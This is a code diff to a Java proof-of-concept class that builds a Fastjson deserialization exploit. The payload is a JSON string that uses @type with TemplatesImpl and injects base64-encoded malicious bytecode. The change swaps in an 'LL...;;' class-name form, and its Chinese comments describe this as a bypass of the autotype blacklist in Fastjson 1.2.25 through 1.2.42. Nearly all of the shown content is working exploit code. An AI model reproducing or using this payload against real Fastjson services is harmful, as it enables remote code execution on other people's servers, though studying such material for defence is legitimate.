@@ -40,13 +40,22 @@ public class jdk7u21_mine {
 
         byte[] evilCode = getevilbyte();
         String evilCode_base64 = Base64.encodeBase64String(evilCode);
-        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
-        String text1 = "{\"@type\":\"" + NASTY_CLASS +
-                "\",\"_bytecodes\":[\""+evilCode_base64+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
-                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
+//        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
+        //1.2.25-41 绕过
+//        final String NASTY_CLASS = "Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;";
+        //1.2.25-42 绕过
+        final String NASTY_CLASS = "LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;";
+        String text1 = "{"+
+                "\"@type\":\"" + NASTY_CLASS +"\","+
+                "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
+                "'_name':'a.b',"+
+                "'_tfactory':{ },"+
+                "'outputProperties':{ }"+
+                "}\n";
         System.out.println(text1);
-
-        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+        //1.2.25-41必须条件
+//        config.setAutoTypeSupport(true);
+//        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
         //assertEquals(Model.class, obj.getClass());
     }
     public static void main(String args[]){
